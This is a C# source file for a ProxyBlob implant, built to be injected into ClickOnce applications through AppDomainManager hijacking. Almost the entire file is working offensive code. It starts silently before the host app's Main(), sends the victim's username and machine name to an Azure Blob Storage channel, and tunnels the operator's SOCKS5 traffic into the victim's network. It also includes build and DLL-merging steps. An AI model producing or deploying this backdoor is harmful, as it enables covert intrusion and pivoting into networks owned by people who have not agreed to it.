/*
 * ProxyBlob Agent — C# Port for ClickOnce AppDomainManager Injection
 * ====================================================================
 * Faithful port of the Go agent from github.com/quarkslab/proxyblob
 *
 * This file is the DLL variant intended for ClickOnce backdooring via
 * AppDomainManager hijacking. For standalone testing, use ProxyBlobStandalone.cs.
 *
 * Placeholders (replaced by clickonce_backdoor.py or manually):
 *   {CLASSNAME}  — AppDomainManager class name (must match .exe.config)
 *   {CONNSTRING} — Base64 connection string from ProxyBlob proxy `create` command
 *
 * Connection string: base64( https://<account>.blob.core.windows.net/<uuid>?<sas> )
 *
 * ── DEPENDENCIES ──
 *   BouncyCastle.Cryptography (NuGet, netstandard2.0 target)
 *   NO Azure SDK — uses raw HTTP REST API with SAS token auth (faced some issue with Azure SDK)
 *
 * ── COMPILE ──
 *   nuget install BouncyCastle.Cryptography -Version 2.5.1 -OutputDirectory packages
 *   csc.exe /t:library /platform:anycpu /out:MyHelper.dll ProxyBlobAgent.cs ^
 *       /r:packages\BouncyCastle.Cryptography.2.5.1\lib\netstandard2.0\BouncyCastle.Cryptography.dll ^
 *       /r:System.Net.Http.dll /r:netstandard.dll
 *
 *   Then merge into single DLL:
 *   ILMerge /out:MyHelperFinal.dll /t:library MyHelper.dll ^
 *       packages\BouncyCastle.Cryptography.2.5.1\lib\netstandard2.0\BouncyCastle.Cryptography.dll ^
 *       /targetplatform:v4
 */

using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Agreement;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Macs;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;

// ═══════════════════════════════════════════════════════════════════
//  AppDomainManager shim — entry point for ClickOnce hijacking
//  The host .exe's .config sets this class as the AppDomainManager.
//  InitializeNewDomain fires before the app's Main().
//
//  IMPORTANT: Uses a foreground Thread (not Task.Run) so the CLR
//  won't terminate the process while the agent is still running.
//  Background threads (Task.Run/ThreadPool) don't prevent exit.
// ═══════════════════════════════════════════════════════════════════
public sealed class {CLASSNAME} : AppDomainManager
{
    private static int _init = 0;
    public override void InitializeNewDomain(AppDomainSetup info)
    {
        if (Interlocked.Exchange(ref _init, 1) != 0) return;
        var t = new Thread(() =>
        {
            try
            {
                Thread.Sleep(2000);
                ProxyBlob.Agent.Run("{CONNSTRING}");
            }
            catch { }
        });
        t.IsBackground = false; // foreground — keeps process alive
        t.Start();
    }
}

namespace ProxyBlob
{
    static class Proto
    {
        public const byte CmdNew=1, CmdAck=2, CmdData=3, CmdClose=4;
        public const int CommandSize=1, UUIDSize=16, DataLengthSize=4;
        public const int HeaderSize = CommandSize + UUIDSize + DataLengthSize;
        public const byte S5=0x05, NoAuth=0x00, Connect=0x01;
        public const byte AIPv4=0x01, ADomain=0x03, AIPv6=0x04;
        public const byte ROk=0x00, RFail=0x01, RNetUnreach=0x03, RHostUnreach=0x04;
        public const byte RConnRefused=0x05, RTTLExpired=0x06, RCmdNotSup=0x07, RAddrNotSup=0x08;
        public static readonly byte[] InfoKey = { 0xDE, 0xAD, 0xB1, 0x0B };
    }

    class Pkt
    {
        public byte Cmd;
        public byte[] ConnId;
        public byte[] Data;

        public byte[] Encode()
        {
            int dlen = Data != null ? Data.Length : 0;
            byte[] buf = new byte[Proto.HeaderSize + dlen];
            buf[0] = Cmd;
            Buffer.BlockCopy(ConnId, 0, buf, 1, 16);
            buf[17]=(byte)(dlen>>24); buf[18]=(byte)(dlen>>16);
            buf[19]=(byte)(dlen>>8);  buf[20]=(byte)(dlen);
            if (dlen > 0) Buffer.BlockCopy(Data, 0, buf, Proto.HeaderSize, dlen);
            return buf;
        }

        public static Pkt Decode(byte[] raw)
        {
            if (raw == null || raw.Length < Proto.HeaderSize) return null;
            byte cmd = raw[0];
            if (cmd < Proto.CmdNew || cmd > Proto.CmdClose) return null;
            byte[] id = new byte[16];
            Buffer.BlockCopy(raw, 1, id, 0, 16);
            uint dl = (uint)((raw[17]<<24)|(raw[18]<<16)|(raw[19]<<8)|raw[20]);
            if ((uint)raw.Length != (uint)Proto.HeaderSize + dl) return null;
            byte[] data = null;
            if (dl > 0) { data = new byte[dl]; Buffer.BlockCopy(raw, Proto.HeaderSize, data, 0, (int)dl); }
            return new Pkt { Cmd = cmd, ConnId = id, Data = data };
        }
    }

    class Conn
    {
        public byte[] Id;
        public byte[] Key;
        public BlockingCollection<byte[]> ReadBuf = new BlockingCollection<byte[]>(128);
        public TcpClient Tcp;
        public CancellationTokenSource Cts = new CancellationTokenSource();
        int _dead;
        public bool Dead { get { return Interlocked.CompareExchange(ref _dead, 0, 0) != 0; } }
        public void Kill()
        {
            if (Interlocked.Exchange(ref _dead, 1) != 0) return;
            Cts.Cancel();
            try { Tcp?.Close(); } catch { }
            try { ReadBuf.CompleteAdding(); } catch { }
        }
        public string IdKey { get { return Convert.ToBase64String(Id); } }
        public static string MakeKey(byte[] id) { return Convert.ToBase64String(id); }
    }

    static class Crypto
    {
        static readonly SecureRandom Rng = new SecureRandom();

        public static void GenX25519(out byte[] priv, out byte[] pub)
        {
            var kpg = new X25519KeyPairGenerator();
            kpg.Init(new X25519KeyGenerationParameters(Rng));
            var kp = kpg.GenerateKeyPair();
            priv = ((X25519PrivateKeyParameters)kp.Private).GetEncoded();
            pub  = ((X25519PublicKeyParameters)kp.Public).GetEncoded();
        }

        public static byte[] DeriveKey(byte[] privRaw, byte[] peerPubRaw, byte[] nonce)
        {
            var priv = new X25519PrivateKeyParameters(privRaw, 0);
            var peer = new X25519PublicKeyParameters(peerPubRaw, 0);
            var agree = new X25519Agreement(); agree.Init(priv);
            byte[] ss = new byte[agree.AgreementSize];
            agree.CalculateAgreement(peer, ss, 0);
            return HkdfSha3256(ss, nonce, 32);
        }

        static byte[] HkdfSha3256(byte[] ikm, byte[] salt, int outputLen)
        {
            byte[] prk = HmacSha3256(salt, ikm);
            return HmacSha3256(prk, new byte[] { 0x01 });
        }

        static byte[] HmacSha3256(byte[] key, byte[] data)
        {
            var hmac = new HMac(new Sha3Digest(256));
            hmac.Init(new KeyParameter(key));
            hmac.BlockUpdate(data, 0, data.Length);
            byte[] r = new byte[hmac.GetMacSize()];
            hmac.DoFinal(r, 0);
            return r;
        }

        public static byte[] Encrypt(byte[] key, byte[] plaintext)
        {
            byte[] nonce = new byte[24]; Rng.NextBytes(nonce);
            byte[] subkey = HChaCha20(key, nonce);
            byte[] ietfNonce = new byte[12];
            Buffer.BlockCopy(nonce, 16, ietfNonce, 4, 8);
            var aead = new ChaCha20Poly1305();
            aead.Init(true, new ParametersWithIV(new KeyParameter(subkey), ietfNonce));
            byte[] ct = new byte[aead.GetOutputSize(plaintext.Length)];
            int len = aead.ProcessBytes(plaintext, 0, plaintext.Length, ct, 0);
            len += aead.DoFinal(ct, len);
            byte[] result = new byte[24 + len];
            Buffer.BlockCopy(nonce, 0, result, 0, 24);
            Buffer.BlockCopy(ct, 0, result, 24, len);
            return result;
        }

        public static byte[] Decrypt(byte[] key, byte[] blob)
        {
            if (blob == null || blob.Length < 40) return null;
            byte[] nonce = new byte[24]; Buffer.BlockCopy(blob, 0, nonce, 0, 24);
            byte[] ct = new byte[blob.Length - 24]; Buffer.BlockCopy(blob, 24, ct, 0, ct.Length);
            try
            {
                byte[] subkey = HChaCha20(key, nonce);
                byte[] ietfNonce = new byte[12];
                Buffer.BlockCopy(nonce, 16, ietfNonce, 4, 8);
                var aead = new ChaCha20Poly1305();
                aead.Init(false, new ParametersWithIV(new KeyParameter(subkey), ietfNonce));
                byte[] plain = new byte[aead.GetOutputSize(ct.Length)];
                int len = aead.ProcessBytes(ct, 0, ct.Length, plain, 0);
                len += aead.DoFinal(plain, len);
                byte[] result = new byte[len];
                Buffer.BlockCopy(plain, 0, result, 0, len);
                return result;
            }
            catch { return null; }
        }

        static byte[] HChaCha20(byte[] key, byte[] nonce)
        {
            uint[] s = new uint[16];
            s[0]=0x61707865; s[1]=0x3320646e; s[2]=0x79622d32; s[3]=0x6b206574;
            s[4]=LE32(key,0);  s[5]=LE32(key,4);  s[6]=LE32(key,8);  s[7]=LE32(key,12);
            s[8]=LE32(key,16); s[9]=LE32(key,20); s[10]=LE32(key,24); s[11]=LE32(key,28);
            s[12]=LE32(nonce,0); s[13]=LE32(nonce,4); s[14]=LE32(nonce,8); s[15]=LE32(nonce,12);
            for (int i = 0; i < 10; i++)
            {
                QR(s,0,4,8,12); QR(s,1,5,9,13); QR(s,2,6,10,14); QR(s,3,7,11,15);
                QR(s,0,5,10,15); QR(s,1,6,11,12); QR(s,2,7,8,13); QR(s,3,4,9,14);
            }
            byte[] sk = new byte[32];
            PLE32(sk,0,s[0]); PLE32(sk,4,s[1]); PLE32(sk,8,s[2]); PLE32(sk,12,s[3]);
            PLE32(sk,16,s[12]); PLE32(sk,20,s[13]); PLE32(sk,24,s[14]); PLE32(sk,28,s[15]);
            return sk;
        }

        static void QR(uint[] s, int a, int b, int c, int d)
        {
            s[a]+=s[b]; s[d]^=s[a]; s[d]=RL(s[d],16);
            s[c]+=s[d]; s[b]^=s[c]; s[b]=RL(s[b],12);
            s[a]+=s[b]; s[d]^=s[a]; s[d]=RL(s[d],8);
            s[c]+=s[d]; s[b]^=s[c]; s[b]=RL(s[b],7);
        }
        static uint RL(uint v, int n) => (v<<n)|(v>>(32-n));
        static uint LE32(byte[] b, int i) => (uint)b[i]|((uint)b[i+1]<<8)|((uint)b[i+2]<<16)|((uint)b[i+3]<<24);
        static void PLE32(byte[] b, int i, uint v)
        { b[i]=(byte)v; b[i+1]=(byte)(v>>8); b[i+2]=(byte)(v>>16); b[i+3]=(byte)(v>>24); }

        public static byte[] Xor(byte[] data, byte[] key)
        {
            byte[] r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) r[i] = (byte)(data[i] ^ key[i % key.Length]);
            return r;
        }
    }

    class BlobHttp
    {
        readonly string _baseUrl, _sas;
        readonly HttpClient _http;
        readonly object _sendLock = new object();
        const int InitDelay = 50, MaxDelay = 3000;

        public BlobHttp(string baseUrl, string sas)
        {
            _baseUrl = baseUrl.TrimEnd('/'); _sas = sas;
            _http = new HttpClient();
            _http.DefaultRequestHeaders.Add("x-ms-version", "2020-10-02");
        }
        string Url(string blob) => _baseUrl + "/" + blob + "?" + _sas;

        public void Send(string blob, byte[] data, CancellationToken ct)
        {
            lock (_sendLock)
            {
                int delay = InitDelay;
                while (!ct.IsCancellationRequested)
                {
                    long sz = GetSize(blob, ct);
                    if (sz > 0) { Thread.Sleep(delay); delay = Math.Min((int)(delay*1.5), MaxDelay); continue; }
                    delay = InitDelay;
                    try { Upload(blob, data, ct); return; }
                    catch (OperationCanceledException) { throw; }
                    catch { Thread.Sleep(delay); delay = Math.Min((int)(delay*1.5), MaxDelay); }
                }
                ct.ThrowIfCancellationRequested();
            }
        }

        public byte[] Recv(string blob, CancellationToken ct)
        {
            int delay = InitDelay;
            while (!ct.IsCancellationRequested)
            {
                long sz = GetSize(blob, ct);
                if (sz <= 0) { Thread.Sleep(delay); delay = Math.Min((int)(delay*1.5), MaxDelay); continue; }
                delay = InitDelay;
                try
                {
                    byte[] data = Download(blob, ct);
                    if (data != null && data.Length > 0) { Clear(blob, ct); return data; }
                }
                catch (OperationCanceledException) { throw; }
                catch { Thread.Sleep(delay); delay = Math.Min((int)(delay*1.5), MaxDelay); }
            }
            ct.ThrowIfCancellationRequested(); return null;
        }

        long GetSize(string blob, CancellationToken ct)
        {
            try
            {
                using (var req = new HttpRequestMessage(HttpMethod.Head, Url(blob)))
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                {
                    if (!resp.IsSuccessStatusCode) return -1;
                    return resp.Content.Headers.ContentLength ?? 0;
                }
            }
            catch (OperationCanceledException) { throw; }
            catch { return -1; }
        }

        byte[] Download(string blob, CancellationToken ct)
        {
            using (var resp = _http.GetAsync(Url(blob), ct).GetAwaiter().GetResult())
            {
                resp.EnsureSuccessStatusCode();
                return resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();
            }
        }

        void Upload(string blob, byte[] data, CancellationToken ct)
        {
            using (var req = new HttpRequestMessage(HttpMethod.Put, Url(blob)))
            {
                req.Headers.Add("x-ms-blob-type", "BlockBlob");
                req.Content = new ByteArrayContent(data);
                req.Content.Headers.ContentType =
                    new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                    resp.EnsureSuccessStatusCode();
            }
        }

        void Clear(string blob, CancellationToken ct)
        {
            int delay = InitDelay;
            while (!ct.IsCancellationRequested)
            {
                try { Upload(blob, new byte[0], ct); return; }
                catch (OperationCanceledException) { throw; }
                catch { Thread.Sleep(delay); delay = Math.Min((int)(delay*1.5), MaxDelay); }
            }
        }

        public void WriteInfo(byte[] data, CancellationToken ct)
        {
            using (var req = new HttpRequestMessage(HttpMethod.Put, Url("info")))
            {
                req.Headers.Add("x-ms-blob-type", "BlockBlob");
                req.Content = new ByteArrayContent(data);
                req.Content.Headers.ContentType =
                    new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                using (var resp = _http.SendAsync(req, ct).GetAwaiter().GetResult())
                    resp.EnsureSuccessStatusCode();
            }
        }

        public bool HealthCheck()
        {
            try
            {
                using (var req = new HttpRequestMessage(HttpMethod.Head, Url("info")))
                using (var resp = _http.SendAsync(req).GetAwaiter().GetResult())
                    return resp.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }

    public static class Agent
    {
        static ConcurrentDictionary<string, Conn> _conns = new ConcurrentDictionary<string, Conn>();
        static BlobHttp _http;
        static CancellationTokenSource _cts;

        public static void Run(string connStr)
        {
            _cts = new CancellationTokenSource();
            string b64 = connStr;
            int pad = b64.Length % 4;
            if (pad > 0) b64 += new string('=', 4 - pad);
            string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
            var uri = new Uri(decoded);
            string baseUrl = uri.Scheme + "://" + uri.Host + uri.AbsolutePath;
            string sas = uri.Query.TrimStart('?');
            _http = new BlobHttp(baseUrl, sas);

            string info = Environment.UserName + "@" + Environment.MachineName;
            byte[] encInfo = Crypto.Xor(Encoding.UTF8.GetBytes(info), Proto.InfoKey);
            _http.WriteInfo(encInfo, _cts.Token);

            Task.Run(() =>
            {
                while (!_cts.IsCancellationRequested)
                { Thread.Sleep(30000); if (!_http.HealthCheck()) { _cts.Cancel(); return; } }
            });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] raw;
                    try { raw = _http.Recv("request", _cts.Token); }
                    catch (OperationCanceledException) { break; }
                    catch { continue; }
                    if (raw == null || raw.Length == 0) continue;
                    var pkt = Pkt.Decode(raw);
                    if (pkt == null) continue;
                    switch (pkt.Cmd)
                    {
                        case Proto.CmdNew:   HandleNew(pkt); break;
                        case Proto.CmdData:  HandleData(pkt); break;
                        case Proto.CmdClose: HandleClose(pkt); break;
                    }
                }
            }
            catch (OperationCanceledException) { }
            finally { foreach (var c in _conns.Values) c.Kill(); }
        }

        static void HandleNew(Pkt pkt)
        {
            string key = Conn.MakeKey(pkt.ConnId);
            if (pkt.Data == null || pkt.Data.Length < 56) return;
            byte[] nonce = new byte[24], sPub = new byte[32];
            Buffer.BlockCopy(pkt.Data, 0, nonce, 0, 24);
            Buffer.BlockCopy(pkt.Data, 24, sPub, 0, 32);
            byte[] priv, pub;
            Crypto.GenX25519(out priv, out pub);
            byte[] symKey = Crypto.DeriveKey(priv, sPub, nonce);
            var conn = new Conn { Id = pkt.ConnId, Key = symKey };
            if (!_conns.TryAdd(key, conn)) return;
            var ack = new Pkt { Cmd = Proto.CmdAck, ConnId = pkt.ConnId, Data = pub };
            try { _http.Send("response", ack.Encode(), _cts.Token); }
            catch { conn.Kill(); _conns.TryRemove(key, out _); return; }
            Task.Run(() => DoSocks(conn));
        }

        static void HandleData(Pkt pkt)
        {
            Conn c; if (!_conns.TryGetValue(Conn.MakeKey(pkt.ConnId), out c) || c.Dead) return;
            byte[] plain = Crypto.Decrypt(c.Key, pkt.Data);
            if (plain == null) { SendClose(pkt.ConnId); return; }
            try { c.ReadBuf.Add(plain); } catch { }
        }

        static void HandleClose(Pkt pkt)
        { Conn c; if (_conns.TryRemove(Conn.MakeKey(pkt.ConnId), out c)) c.Kill(); }

        static void DoSocks(Conn c)
        {
            try
            {
                byte[] m = Take(c); if (m == null) { CloseConn(c); return; }
                bool ok = false;
                for (int i = 0; i < m.Length; i++) if (m[i] == Proto.NoAuth) { ok = true; break; }
                if (!ok) { Tx(c, new byte[]{Proto.S5,0xFF}); CloseConn(c); return; }
                Tx(c, new byte[] { Proto.S5, Proto.NoAuth });
                byte[] cmd = Take(c);
                if (cmd == null || cmd.Length < 4 || cmd[0] != Proto.S5) { CloseConn(c); return; }
                if (cmd[1] == Proto.Connect) DoConnect(c, cmd);
                else { Tx(c, SocksReply(Proto.RCmdNotSup)); CloseConn(c); }
            }
            catch { CloseConn(c); }
        }

        static void DoConnect(Conn c, byte[] cmd)
        {
            string target;
            try { target = ParseAddr(cmd, 3); }
            catch { Tx(c, SocksReply(Proto.RFail)); CloseConn(c); return; }
            TcpClient tcp;
            try
            {
                int lc = target.LastIndexOf(':');
                string host = target.Substring(0, lc).Trim('[', ']');
                int port = int.Parse(target.Substring(lc + 1));
                tcp = new TcpClient();
                var ar = tcp.BeginConnect(host, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(10000)) { tcp.Close(); throw new TimeoutException(); }
                tcp.EndConnect(ar);
            }
            catch { Tx(c, SocksReply(Proto.RConnRefused)); CloseConn(c); return; }
            c.Tcp = tcp;
            var ep = (IPEndPoint)tcp.Client.LocalEndPoint;
            byte[] r = new byte[10];
            r[0]=Proto.S5; r[1]=Proto.ROk; r[3]=Proto.AIPv4;
            byte[] ipb = ep.Address.MapToIPv4().GetAddressBytes();
            if (ipb.Length >= 4) Buffer.BlockCopy(ipb, 0, r, 4, 4);
            r[8]=(byte)(ep.Port>>8); r[9]=(byte)(ep.Port&0xFF);
            Tx(c, r);
            var stream = tcp.GetStream();
            Task.Run(() =>
            {
                byte[] buf = new byte[131072];
                try { while (!c.Dead) { int n=stream.Read(buf,0,buf.Length); if(n<=0) break;
                    byte[] chunk=new byte[n]; Buffer.BlockCopy(buf,0,chunk,0,n); Tx(c, chunk); } }
                catch { } finally { CloseConn(c); }
            });
            try { while (!c.Dead) { byte[] d = Take(c); if (d==null) break;
                stream.Write(d, 0, d.Length); stream.Flush(); } }
            catch { } finally { CloseConn(c); }
        }

        static byte[] Take(Conn c)
        { try { return c.ReadBuf.Take(c.Cts.Token); } catch { return null; } }

        static void Tx(Conn c, byte[] data)
        {
            if (c.Dead) return;
            byte[] enc = Crypto.Encrypt(c.Key, data);
            var pkt = new Pkt { Cmd = Proto.CmdData, ConnId = c.Id, Data = enc };
            try { _http.Send("response", pkt.Encode(), _cts.Token); } catch { }
        }

        static void CloseConn(Conn c)
        {
            if (!_conns.TryRemove(c.IdKey, out _) && c.Dead) return;
            c.Kill();
            var pkt = new Pkt { Cmd = Proto.CmdClose, ConnId = c.Id, Data = new byte[]{0} };
            try { _http.Send("response", pkt.Encode(), _cts.Token); } catch { }
        }

        static void SendClose(byte[] connId)
        {
            var pkt = new Pkt { Cmd = Proto.CmdClose, ConnId = connId, Data = new byte[]{0} };
            try { _http.Send("response", pkt.Encode(), _cts.Token); } catch { }
        }

        static byte[] SocksReply(byte code)
            => new byte[] { Proto.S5, code, 0, Proto.AIPv4, 0, 0, 0, 0, 0, 0 };

        static string ParseAddr(byte[] b, int off)
        {
            byte a = b[off]; int c = off+1; string h; int p;
            switch (a)
            {
                case Proto.AIPv4: h=b[c]+"."+b[c+1]+"."+b[c+2]+"."+b[c+3]; c+=4; break;
                case Proto.ADomain: int dl=b[c++]; h=Encoding.ASCII.GetString(b,c,dl); c+=dl; break;
                case Proto.AIPv6: var i6=new byte[16]; Buffer.BlockCopy(b,c,i6,0,16);
                    h="["+new IPAddress(i6)+"]"; c+=16; break;
                default: throw new Exception("bad atyp");
            }
            p = (b[c]<<8)|b[c+1];
            return h+":"+p;
        }
    }
}
